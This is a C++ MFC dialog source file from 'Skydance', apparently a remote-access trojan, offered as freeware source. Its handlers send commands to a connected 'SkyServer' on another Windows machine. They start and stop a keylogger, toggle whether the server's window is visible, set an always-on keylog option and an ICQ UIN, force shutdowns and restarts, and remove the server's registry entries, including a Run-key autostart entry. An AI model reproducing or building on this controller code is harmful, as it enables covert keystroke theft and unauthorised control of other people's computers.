/**********************************************************************************/
// Read this First!
// Skydance 2.291 Beta Release source code for MFC-VC++ 6.0
// by Edrin@gmx.net
//
// http://skd.box.sk
// - USE SKYDANCE/SKYDANCE SOURCE-CODE AND/OR IT`S COMPONENTS ON YOUR OWN RISK -
//
// Introduction:
//	This Source is FREEWARE!
//	SkyServer is a component of Skydance!
//	Skydance is designed to control other Win95/98/NT systems in tcp/ip-nets like Internet and Intranets.
//	Skydance 2.291 Beta Release is a program that will remain "under construction" and i will NEVER be
//	responsible for any HARM or harmfull things that happend because SKYDANCE(or skydance-source) was USED! 
//	That means I do NOT	guarantee for any features and security-thing
//	and i do not guarantee that this program works proper!!!
//	Indeed i guarantee for nothing ;)
//good luck, Edrin
/**********************************************************************************/
// DlgSpecial.cpp: Implementierungsdatei
//

#include "stdafx.h"
#include "Skydance.h"
#include "DlgSpecial.h"
#include "SkydanceDoc.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// Dialogfeld CDlgSpecial 


CDlgSpecial::CDlgSpecial(CWnd* pParent /*=NULL*/)
	: CDialog(CDlgSpecial::IDD, pParent)
{
	//{{AFX_DATA_INIT(CDlgSpecial)
	m_sPass = _T("");
	m_sFileName = _T("");
	m_bSettings = FALSE;
	m_sActionToPerform = _T("");
	m_iPort = 0;
	m_bDlgVisible = FALSE;
	m_sPassReenter = _T("");
	m_sDLLFile = _T("skdl.dll");
	m_sLogFile = _T("");
	m_bKeyLogAlways = FALSE;
	m_sUIN = _T("");
	//}}AFX_DATA_INIT
}


void CDlgSpecial::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDlgSpecial)
	DDX_Text(pDX, IDC_EDIT2, m_sPass);
	DDX_Text(pDX, IDC_EDIT3, m_sFileName);
	DDX_Check(pDX, IDC_CHECK1, m_bSettings);
	DDX_CBString(pDX, IDC_COMBOACTION, m_sActionToPerform);
	DDX_Text(pDX, IDC_EDIT1, m_iPort);
	DDV_MinMaxInt(pDX, m_iPort, 1, 45000);
	DDX_Check(pDX, IDC_CHECK2, m_bDlgVisible);
	DDX_Text(pDX, IDC_EDIT4, m_sPassReenter);
	DDV_MaxChars(pDX, m_sPassReenter, 10);
	DDX_Text(pDX, IDC_EDITDLLFILE, m_sDLLFile);
	DDX_Text(pDX, IDC_EDITLOGFILE, m_sLogFile);
	DDX_Check(pDX, IDC_CHECKKEYLOG, m_bKeyLogAlways);
	DDX_Text(pDX, IDC_EDITUIN, m_sUIN);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CDlgSpecial, CDialog)
	//{{AFX_MSG_MAP(CDlgSpecial)
	ON_BN_CLICKED(IDC_BTACTIONSEND, OnBtactionsend)
	ON_BN_CLICKED(IDC_CHECK1, OnCheck1)
	ON_BN_CLICKED(IDC_BTCHANGE, OnBtchange)
	ON_BN_CLICKED(IDC_BTSSERVER, OnBtsserver)
	ON_BN_CLICKED(IDC_BTKLSTART, OnBtklstart)
	ON_BN_CLICKED(IDC_BTKLSTOP, OnBtklstop)
	ON_BN_CLICKED(IDC_BTREMO, OnBtremo)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// Behandlungsroutinen für Nachrichten CDlgSpecial 

void CDlgSpecial::OnBtactionsend() 
{
	UpdateData(TRUE);
	CSkydanceDoc *pSkydanceDoc = CSkydanceDoc::GetDoc();
	CString ActionToPerform = m_sActionToPerform;
	if (m_sActionToPerform == "Shutdown Windows") ActionToPerform = "RUNDLL USER.EXE,ExitWindows";
	if (m_sActionToPerform == "Restart Windows") ActionToPerform = "RUNDLL USER.EXE,ExitWindowsExec";
	if (m_sActionToPerform == "System Settings Changed...") ActionToPerform = "RUNDLL SHELL.DLL,RestartDialog";
	//if (m_dSpecialDlg.m_sActionToPerform == "Install Screensaver") ActionToPerform = "Install ScreensaverRUNDLL32 DESK.CPL,InstallScreenSaver ";
	if (m_sActionToPerform == "Swap MouseButton") ActionToPerform = "RUNDLL USER.EXE,SwapMouseButton";
	pSkydanceDoc->SendPack("run<" + ActionToPerform + "</");
	pSkydanceDoc->m_sStat2 = "Sending Special Command";
	pSkydanceDoc->m_pLeftRecView->AddEvent(m_sActionToPerform, 0);
}

void CDlgSpecial::OnCheck1() 
{
	UpdateData(TRUE);
	if (m_bSettings == TRUE)
	{
		GetDlgItem(IDC_EDIT1)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT2)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT3)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT4)->EnableWindow(TRUE);
		GetDlgItem(IDC_BTCHANGE)->EnableWindow(TRUE);		
		GetDlgItem(IDC_STATICS1)->EnableWindow(TRUE);
		GetDlgItem(IDC_STATICS2)->EnableWindow(TRUE);
		GetDlgItem(IDC_STATICS3)->EnableWindow(TRUE);
		GetDlgItem(IDC_STATICS4)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHECK2)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHECKKEYLOG)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDITUIN)->EnableWindow(TRUE);
		GetDlgItem(IDC_STATIC7)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT1)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT2)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT3)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT4)->EnableWindow(FALSE);
		GetDlgItem(IDC_BTCHANGE)->EnableWindow(FALSE);
		GetDlgItem(IDC_STATICS1)->EnableWindow(FALSE);
		GetDlgItem(IDC_STATICS2)->EnableWindow(FALSE);
		GetDlgItem(IDC_STATICS3)->EnableWindow(FALSE);
		GetDlgItem(IDC_STATICS4)->EnableWindow(FALSE);
		GetDlgItem(IDC_CHECK2)->EnableWindow(FALSE);
		GetDlgItem(IDC_CHECKKEYLOG)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDITUIN)->EnableWindow(FALSE);
		GetDlgItem(IDC_STATIC7)->EnableWindow(FALSE);
	}
}

void CDlgSpecial::OnBtchange() 
{
	UpdateData(TRUE);
	CSkydanceDoc *pSkydanceDoc = CSkydanceDoc::GetDoc();
	char buff[8];
	itoa(m_iPort,buff,10);
	CString sPort = buff;
	CString sVisibility;
	CString sKeyLogAllways;
	if(m_bDlgVisible == TRUE) sVisibility = "1";
	else sVisibility = "0";
	if(m_bKeyLogAlways == TRUE) sKeyLogAllways = "1";
	else sKeyLogAllways = "0";
	if(m_sPass == m_sPassReenter)
	{
	pSkydanceDoc->SendPack("ChangeSettings<" + m_sPass + '<' + m_sFileName + '<' 
		+ sPort + '<' + sVisibility + '<' + m_sDLLFile + '<' + m_sLogFile + '<' 
		+ sKeyLogAllways + '<' + m_sUIN + "</");
	
	GetDlgItem(IDC_EDIT1)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT2)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT3)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT4)->EnableWindow(FALSE);
	GetDlgItem(IDC_BTCHANGE)->EnableWindow(FALSE);
	GetDlgItem(IDC_STATICS1)->EnableWindow(FALSE);
	GetDlgItem(IDC_STATICS2)->EnableWindow(FALSE);
	GetDlgItem(IDC_STATICS3)->EnableWindow(FALSE);
	GetDlgItem(IDC_STATICS4)->EnableWindow(FALSE);
	GetDlgItem(IDC_CHECK2)->EnableWindow(FALSE);
	GetDlgItem(IDC_CHECKKEYLOG)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDITUIN)->EnableWindow(FALSE);
	GetDlgItem(IDC_STATIC7)->EnableWindow(FALSE);
	m_bSettings = FALSE;
	UpdateData(FALSE);
	}
	else MessageBox("Reenter Password ! Something was wrong...");
}

void CDlgSpecial::OnBtsserver() 
{
	if(MessageBox("Are you sure you want to close SkyServer?", "Shutdown SkyServer", MB_OKCANCEL) == IDOK)
	{
		CSkydanceDoc *pSkydanceDoc = CSkydanceDoc::GetDoc();
		pSkydanceDoc->SendPack("TurnOff</");
	}
}

void CDlgSpecial::OnBtklstart() 
{
	UpdateData(TRUE);
	CSkydanceDoc *pSkydanceDoc = CSkydanceDoc::GetDoc();
	pSkydanceDoc->SendPack("StartKeyLog<" + m_sDLLFile +"<" + m_sLogFile + "</");
}

void CDlgSpecial::OnBtklstop() 
{
	//UpdateData(TRUE);
	CSkydanceDoc *pSkydanceDoc = CSkydanceDoc::GetDoc();
	pSkydanceDoc->SendPack("StopKeyLog</");
}

void CDlgSpecial::OnBtremo() 
{
	if(MessageBox("Are you sure you want to REMOVE all SkyServer-Registry-Data from the connected computer???", "Deactivate SkyServer", MB_OKCANCEL) == IDOK)
	{
		CSkydanceDoc *pSkydanceDoc = CSkydanceDoc::GetDoc();
		CString sHKEY = "2";
		CString RunKeyName = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		CString IniKeyName = "\\Software\\Microsoft\\Windows\\CurrentVersion";
		
		pSkydanceDoc->SendPack("DeleteRegKey<" + sHKEY + "<" + IniKeyName + "<" + "SkdPass" + "</");
		pSkydanceDoc->SendPack("DeleteRegKey<" + sHKEY + "<" + IniKeyName + "<" + "SkdDlg" + "</");
		pSkydanceDoc->SendPack("DeleteRegKey<" + sHKEY + "<" + IniKeyName + "<" + "SkdPort" + "</");
		pSkydanceDoc->SendPack("DeleteRegKey<" + sHKEY + "<" + IniKeyName + "<" + "SkdLog" + "</");
		pSkydanceDoc->SendPack("DeleteRegKey<" + sHKEY + "<" + IniKeyName + "<" + "SkdLA" + "</");
		pSkydanceDoc->SendPack("DeleteRegKey<" + sHKEY + "<" + IniKeyName + "<" + "SkdDLL" + "</");
		pSkydanceDoc->SendPack("DeleteRegKey<" + sHKEY + "<" + IniKeyName + "<" + "SkdUIN" + "</");
		pSkydanceDoc->SendPack("DeleteRegKey<" + sHKEY + "<" + RunKeyName + "<" + "Skd" + "</");
		AfxMessageBox("All SkyServer-Registry-Data removed");
	}
}
